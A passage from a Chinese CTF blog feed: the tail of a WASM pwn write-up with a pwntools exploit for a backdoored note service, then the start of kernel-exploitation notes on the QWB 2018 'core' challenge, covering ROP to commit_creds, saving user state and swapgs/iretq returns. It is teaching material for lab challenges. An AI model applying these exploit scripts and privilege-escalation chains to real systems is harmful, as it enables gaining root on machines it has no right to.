__GI___readv (fd=0, iov=0x555556fbb5c0, iovcnt=1) at ../sysdeps/unix/sysv/linux/readv.c:26</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">1  0x0000555556424da4 <span class="keyword">in</span> std::sys::unix::fd::FileDesc::read_vectored () at library/std/src/sys/unix/fd.rs:99</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">2  std::sys::unix::fs::File::read_vectored () at library/std/src/sys/unix/fs.rs:1119</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">3  &lt;&amp;std::fs::File as std::io::Read&gt;::read_vectored () at library/std/src/fs.rs:810</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">4  0x0000555555b704e0 <span class="keyword">in</span> &lt;wasi_cap_std_sync::stdio::Stdin as wasi_common::file::WasiFile&gt;::read_vectored::&#123;&#123;closure&#125;&#125; () at library/core/src/str/pattern.rs:1796</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">5  0x0000555555b93eaf <span class="keyword">in</span> wasi_common::snapshots::preview_1::&lt;impl wasi_common::snapshots::preview_1::wasi_snapshot_preview1::WasiSnapshotPreview1 <span class="keyword">for</span> wasi_common::ctx::WasiCtx&gt;::fd_read::&#123;&#123;closure&#125;&#125; () at library/core/src/str/pattern.rs:1796</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">6  0x000055555583be3f <span class="keyword">in</span> &lt;tracing::instrument::Instrumented&lt;T&gt; as core::future::future::Future&gt;::poll () at library/core/src/str/pattern.rs:1796</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">7  0x00005555557e3db3 <span class="keyword">in</span> wiggle::run_in_dummy_executor () at library/core/src/str/pattern.rs:1796</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">8  0x0000555555859720 <span class="keyword">in</span> &lt;core::panic::unwind_safe::AssertUnwindSafe&lt;F&gt; as core::ops::<span class="keyword">function</span>::FnOnce&lt;()&gt;&gt;::call_once () at library/core/src/str/pattern.rs:1796</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">9  0x00005555558bcd04 <span class="keyword">in</span> wasmtime_runtime::instance::Instance::from_vmctx () at library/core/src/str/pattern.rs:1796</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">10 0x00005555558eede9 <span class="keyword">in</span> &lt;F as wasmtime::func::IntoFunc&lt;T,(wasmtime::func::Caller&lt;T&gt;,A1,A2,A3,A4),R&gt;&gt;::into_func::native_call_shim () at library/core/src/str/pattern.rs:1796</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">11 0x00007ffff7c0a70a <span class="keyword">in</span> ?? ()</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">12 0x00007fffffffba30 <span class="keyword">in</span> ?? ()</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">13 0x00007ffff7c01f75 <span class="keyword">in</span> ?? ()</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">14 0x00007ffe77bb1000 <span class="keyword">in</span> ?? ()</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">15 0x0000000000501c50 <span class="keyword">in</span> ?? ()</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">16 0x0000000000000000 <span class="keyword">in</span> ?? ()</span></span><br></pre></td></tr></table></figure><p>函数调用栈十分复杂,当然顶上那一批都是wasmtime的调用api</p><p>我们主要关注wtoa映射的部分</p><p>一直<code>finish</code>到代码映射段,之后ni单步</p><p>以add函数为例</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-01-19_134822.png" alt=""></p><p>这是跳过wasmtime api之后的部分,之后不停的ni</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-01-19_134958.png" alt=""></p><p>可以看到在ni进入<code>0x7ffff7bff2f0</code>时,底下出现了字符串信息</p><p>那么大致便可以确定<code>0x7ffff7bff2f0-0x7ffff7bff000+0x1000=0x12f0</code>处便是add函数了</p><p>以此类推能得到其他函数的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">menu: 0x2120</span><br><span class="line">add: 0x12F0</span><br><span class="line">delete: 0x19C0</span><br><span class="line">edit: 0x15D0</span><br><span class="line">show: 0x1BA0</span><br><span class="line">exit: 0x2900</span><br></pre></td></tr></table></figure><p>确定完这些主要函数后便能够进入ida开始更多地静态分析了</p><p>不过在此之前还得先确定一些辅助函数</p><p>si进入以上任意一个函数中,继续使用以上的方法</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-01-19_135922.png" alt=""></p><p>可以判断出以下函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getinput: 0x3EF0</span><br><span class="line">output: 0x3DD0</span><br><span class="line">atoi: 0x2990</span><br></pre></td></tr></table></figure><h3 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h3><p>edit函数留有后门，可以直接修改node的结构体。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v12 == <span class="number">0x345231</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)(v5 + <span class="number">4016</span>) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v14 = *(_DWORD *)(v5 + v4 + <span class="number">44</span>);</span><br><span class="line">    *(_DWORD *)(v5 + v4 + <span class="number">4</span>) = *(_DWORD *)(v5 + v4 + <span class="number">40</span>);</span><br><span class="line">    *(_DWORD *)(v5 + v4) = v14;</span><br><span class="line">    output(a1, a1, <span class="number">1246LL</span>, (<span class="type">unsigned</span> <span class="type">int</span>)(v20 - <span class="number">96</span>));</span><br><span class="line">    wasm_0_::function_9_(</span><br><span class="line">      a1,</span><br><span class="line">      a1,</span><br><span class="line">      (<span class="type">unsigned</span> <span class="type">int</span>)(*(_DWORD *)(v19 + <span class="number">40</span>)</span><br><span class="line">                   + *(_DWORD *)(v5</span><br><span class="line">                               + *(<span class="type">unsigned</span> <span class="type">int</span> *)(v5</span><br><span class="line">                                                 + (<span class="type">unsigned</span> <span class="type">int</span>)(*(_DWORD *)(v5 + *(<span class="type">unsigned</span> <span class="type">int</span> *)(v19 + <span class="number">92</span>) + <span class="number">4</span>)</span><br><span class="line">                                                                + <span class="number">4</span> * *(_DWORD *)(v5 + v4 + <span class="number">44</span>))))),</span><br><span class="line">      <span class="number">48LL</span>);</span><br><span class="line">    *(_DWORD *)(v5 + <span class="number">4016</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_15;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>如果length为0x345231的话可以进入一个特殊分支</p><p>这个分支依然有点难读,不过此时完全可以直接调试来判断后门的功能</p><p>最终<strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">sh=process(<span class="string">&#x27;./launch.sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">content</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;Choice &gt; &#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;size &gt; &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(content)).encode())</span><br><span class="line">    sh.sendafter(<span class="string">b&#x27; &gt; &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, offset, length, content</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;Choice &gt; &#x27;</span>, <span class="string">b&#x27;E&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;index &gt; &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;offset &gt; &#x27;</span>, <span class="built_in">str</span>(offset).encode())</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;length &gt; &#x27;</span>, <span class="built_in">str</span>(length).encode())</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27; &gt; &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index, offset, length</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;Choice &gt; &#x27;</span>, <span class="string">b&#x27;S&#x27;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;index &gt; &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;offset &gt; &#x27;</span>, <span class="built_in">str</span>(offset).encode())</span><br><span class="line">    sh.sendlineafter(<span class="string">b&#x27;length &gt; &#x27;</span>, <span class="built_in">str</span>(length).encode())</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = remote(&#x27;47.100.169.26&#x27;, 20231)</span></span><br><span class="line"></span><br><span class="line">add(<span class="string">b&#x27;AB&#x27;</span>)</span><br><span class="line">add(<span class="string">b&#x27;CD&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0x345231</span>, flat(&#123;<span class="number">0x20</span>:<span class="number">0x501b40</span>, <span class="number">0x28</span>:<span class="number">0x100</span>&#125;, filler=<span class="string">b&#x27;\0&#x27;</span>, length=<span class="number">0x30</span>))</span><br><span class="line">show(<span class="number">1</span>, <span class="number">0</span>, <span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">WASM</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="wasm" scheme="https://ixout.github.io/tags/wasm/"/>
    
    <category term="webpwn" scheme="https://ixout.github.io/tags/webpwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel学习笔记1</title>
    <link href="https://ixout.github.io/posts/13785/"/>
    <id>https://ixout.github.io/posts/13785/</id>
    <published>2023-12-28T08:25:43.000Z</published>
    <updated>2024-03-17T12:25:34.743Z</updated>
    
    <content type="html"><![CDATA[<h1 id="强网杯-2018-core"><a href="#强网杯-2018-core" class="headerlink" title="强网杯 2018 - core"></a>强网杯 2018 - core</h1><h2 id="Kernel-ROP"><a href="#Kernel-ROP" class="headerlink" title="Kernel ROP"></a>Kernel ROP</h2><p><strong>内核态的 ROP 与用户态的 ROP 一般无二，只不过利用的 gadget 变成了内核中的 gadget，所需要构造执行的 ropchain 由</strong> <code>system(&quot;/bin/sh&quot;)</code> <strong>变为了</strong> <code>commit_creds(&amp;init_cred)</code> 或 <code>commit_creds(prepare_kernel_cred(NULL))</code>，当我们成功地在内核中执行这样的代码后，当前线程的 cred 结构体便变为 init 进程的 cred 的拷贝，我们也就获得了 root 权限，此时在用户态起一个 shell 便能获得 root shell。</p><h3 id="状态保存"><a href="#状态保存" class="headerlink" title="状态保存"></a>状态保存</h3><p>通常情况下，我们的 exploit 需要进入到内核当中完成提权，而我们最终仍然需要<strong>着陆回用户态</strong>以获得一个 root 权限的 shell，因此在我们的 exploit 进入内核态之前我们需要<strong>手动模拟用户态进入内核态的准备工作</strong>——<strong>保存各寄存器的值到内核栈上</strong>，以便于后续着陆回用户态。</p><p>通常情况下使用如下函数保存各寄存器值到我们自己定义的变量中，以便于构造 rop 链：</p><blockquote><p>算是一个通用的 pwn 板子。</p><p>方便起见，使用了内联汇编，编译时需要指定参数：<code>-masm=intel</code>。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="返回用户态"><a href="#返回用户态" class="headerlink" title="返回用户态"></a>返回用户态</h3><p>由内核态返回用户态只需要：</p><ul><li><code>swapgs</code>指令恢复用户态 GS 寄存器</li><li><code>sysretq</code>或者<code>iretq</code>恢复到用户空间</li></ul><p>那么我们只需要在内核中找到相应的 gadget 并执行<code>swapgs;iretq</code>就可以成功着陆回用户态。</p><p>通常来说，我们应当构造如下 rop 链以返回用户态并获得一个 shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">↓   swapgs</span><br><span class="line">    iretq</span><br><span class="line">    user_shell_addr</span><br><span class="line">    user_cs</span><br><span class="line">    user_eflags //64bit user_rflags</span><br><span class="line">    user_sp</span><br><span class="line">    user_ss</span><br></pre></td></tr></table></figure><h3 id="swapgs"><a href="#swapgs" class="headerlink" title="swapgs"></a>swapgs</h3><p>交换内核态与用户态的gs寄存器</p><h3 id="iretq-amp-amp-sysretq"><a href="#iretq-amp-amp-sysretq" class="headerlink" title="iretq&amp;&amp;sysretq"></a>iretq&amp;&amp;sysretq</h3><p>这两个指令都是用于返回用户态</p><p>其中iretq等效</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop rip</span><br><span class="line">pop cs</span><br><span class="line">pop rflags</span><br><span class="line">pop rsp</span><br><span class="line">pop ss</span><br></pre></td></tr></table></figure><p>sysretq则等效</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop rip</span><br></pre></td></tr></table></figure><h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><p>首先文件解压出来提供了四个文件,bzImage,core.cpio,start.sh和vmlinux</p><p>其中bzImage是压缩后的内核镜像,去除了大多数的调试符号</p><p>core.cpio是提供给内核的文件系统</p><p>start.sh是启动内核的脚本</p><p>vmlinux则是未经过压缩的静态链接的内核镜像,其中具有更多的调试符号,更利于调试,如果没有这个文件可以利用linus提供的<a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">extract-vmlinux</a>脚本从bzImage中分离出来</p><p>观察以下start.sh启动脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">     │ File: ./start.sh</span><br><span class="line">───────┼────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ qemu-system-x86_64 \</span><br><span class="line">   2   │ -m 256M \</span><br><span class="line">   3   │ -kernel ./bzImage \#指定内核镜像</span><br><span class="line">   4   │ -initrd  ./core.cpio \#指定初始的根文件系统</span><br><span class="line">   5   │ -append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \</span><br><span class="line">   6   │ -s  \#开启调试</span><br><span class="line">   7   │ -netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">   8   │ -nographic  \#不使用图形化界面</span><br></pre></td></tr></table></figure><p><code>-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot;</code></p><ul><li><code>quiet</code>: 禁用一些冗长的启动消息，以使启动过程更为静默。</li><li><code>kaslr</code>: 表示启用内核地址空间随机化</li></ul><p>解压core.cpio后看一下其中的init文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">───────┬─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">       │ File: init</span><br><span class="line">───────┼─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ #!/bin/sh</span><br><span class="line">   2   │ mount -t proc proc /proc</span><br><span class="line">   3   │ mount -t sysfs sysfs /sys</span><br><span class="line">   4   │ mount -t devtmpfs none /dev</span><br><span class="line">   5   │ /sbin/mdev -s</span><br><span class="line">   6   │ mkdir -p /dev/pts</span><br><span class="line">   7   │ mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">   8   │ chmod 666 /dev/ptmx</span><br><span class="line">   9   │ cat /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line">  10   │ echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">  11   │ echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">  12   │ ifconfig eth0 up</span><br><span class="line">  13   │ udhcpc -i eth0</span><br><span class="line">  14   │ ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">  15   │ route add default gw 10.0.2.2 </span><br><span class="line">  16   │ insmod /core.ko</span><br><span class="line">  17   │ </span><br><span class="line">  18   │ #poweroff -d 120 -f &amp;</span><br><span class="line">  19   │ setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line">  20   │ echo &#x27;sh end!\n&#x27;</span><br><span class="line">  21   │ umount /proc</span><br><span class="line">  22   │ umount /sys</span><br><span class="line">  23   │ </span><br><span class="line">  24   │ #poweroff -d 0  -f</span><br></pre></td></tr></table></figure><ul><li><p><code>mount</code>命令用于挂载文件系统</p><ul><li><code>-t</code>选项指定挂载文件系统类型</li><li><code>-o</code>挂载选项</li></ul><p>例如<code>mount -vt devpts -o gid=4,mode=620 none /dev/pts</code>,将<code>devpts</code>文件系统挂载到<code>/dev/pts</code>目录,使用<code>none</code>作为源设备,即不需要源设备文件,挂载的目录的属性为<code>组别4,权限是620</code></p></li><li><p><code>/sbin/mdev</code>是一个轻量级的设备管理工具，通常用于嵌入式 Linux 系统中，用于在系统启动时自动创建和管理设备节点。</p><ul><li><code>-s</code>  ,用于启用 <code>mdev</code> 的守护进程（daemon）模式</li></ul><p>当运行 <code>/sbin/mdev -s</code> 时，<code>mdev</code> 将以守护进程的形式运行，并在后台监听设备的变化。</p></li><li><p><code>ifconfig eth0 up</code> 是一个 Linux 命令，用于启用(激活)网络接口</p></li><li><p><code>umount</code>与<code>mount</code>相反,卸载挂载的文件系统</p></li><li><p><code>setuidgid</code> 是一个busybox提供的一个工具，用于以指定的用户ID启动程序。</p></li><li><p><code>setsid</code>是一个 Unix/Linux 命令，用于启动一个新的会话。这个命令将当前进程设置为新会话的领头进程（session leader）。通常，<code>setsid</code> 用于创建一个与父进程和之前的会话完全脱离的新会话，这对于将进程变成守护进程很有用，因为它与原始终端会话无关。</p><p><code>setsid /bin/cttyhack setuidgid 1000 /bin/sh</code>作用是创建一个新的会话，执行 <code>/bin/cttyhack</code> 工具，然后以用户 ID 1000 的身份启动 <code>/bin/sh</code> shell</p></li><li><p><code>insomod</code>的作用是加载驱动模块,加载后的驱动模块会出现在<code>/sys/module/</code>中</p></li></ul><p>init中比较重要的几点是</p><ul><li>第 9 行中把 <code>kallsyms</code> 的内容保存到了 <code>/tmp/kallsyms</code> 中，那么我们就能从 <code>/tmp/kallsyms</code> 中读取 <code>commit_creds</code>，<code>prepare_kernel_cred</code> 的函数的地址了</li><li>第 10 行把 <code>kptr_restrict</code> 设为 1，这样就不能通过 <code>/proc/kallsyms</code> 查看函数地址了，但第 9 行已经把其中的信息保存到了一个可读的文件中，这句就无关紧要了</li><li>第 11 行把 <code>dmesg_restrict</code> 设为 1，这样就不能通过 <code>dmesg</code> 查看 kernel 的信息了</li></ul><h2 id="模块分析"><a href="#模块分析" class="headerlink" title="模块分析"></a>模块分析</h2><p>检查一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/core/core/core.ko&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure><p>存在canary,ida进一步静态分析</p><p>存在七个主要函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">core_release.text<span class="number">0000000000000000</span><span class="number">00000011</span><span class="number">00000000</span></span><br><span class="line">core_write.text<span class="number">0000000000000011</span><span class="number">00000052</span><span class="number">00000010</span></span><br><span class="line">core_read.text<span class="number">0000000000000063</span><span class="number">00000093</span><span class="number">00000050</span></span><br><span class="line">core_copy_func.text<span class="number">00000000000000F</span>6<span class="number">00000069</span><span class="number">00000050</span></span><br><span class="line">core_ioctl.text<span class="number">000000000000015F</span><span class="number">0000005</span>A<span class="number">00000008</span></span><br><span class="line">init_module.init.text<span class="number">00000000000001B</span>9<span class="number">00000032</span><span class="number">00000000</span></span><br><span class="line">exit_core.<span class="built_in">exit</span>.text<span class="number">00000000000001</span>EB<span class="number">00000019</span><span class="number">00000000</span></span><br></pre></td></tr></table></figure><p><strong>init_module()</strong> 注册了 <code>/proc/core</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">init_module</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  core_proc = proc_create(<span class="string">&quot;core&quot;</span>, <span class="number">438LL</span>, <span class="number">0LL</span>, &amp;core_fops);</span><br><span class="line">  printk(<span class="string">&quot;\x016core: created /proc/core entry\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>exit_core()</strong> 删除 <code>/proc/core</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">exit_core</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( core_proc )</span><br><span class="line">    result = remove_proc_entry(<span class="string">&quot;core&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>core_ioctl()</strong> 定义了三条命令，分别调用 <strong>core_read()</strong>，<strong>core_copy_func()</strong> 和设置全局变量 <strong>off</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_ioctl</span><span class="params">(__int64 a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1719109787</span>:</span><br><span class="line">      core_read(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1719109788</span>:</span><br><span class="line">      printk(&amp;unk_2CD);</span><br><span class="line">      off = a3;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1719109786</span>:</span><br><span class="line">      printk(&amp;unk_2B3);</span><br><span class="line">      core_copy_func(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>core_read()</strong> 从 <code>v4[off]</code> 拷贝 64 个字节到用户空间，但要注意的是全局变量 <code>off</code> 使我们能够控制的，因此可以合理的控制 <code>off</code> 来 leak canary 和一些地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">core_read</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">signed</span> __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v1 = a1;</span><br><span class="line">  v5 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(<span class="string">&quot;\x016core: called core_read\n&quot;</span>);</span><br><span class="line">  printk(<span class="string">&quot;\x016%d %p\n&quot;</span>);</span><br><span class="line">  v2 = v4;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">16LL</span>; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v2 = <span class="number">0</span>;</span><br><span class="line">    v2 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(v4, <span class="string">&quot;Welcome to the QWB CTF challenge.\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( copy_to_user(v1, &amp;v4[off], <span class="number">64LL</span>) )</span><br><span class="line">    __asm &#123; swapgs &#125;</span><br><span 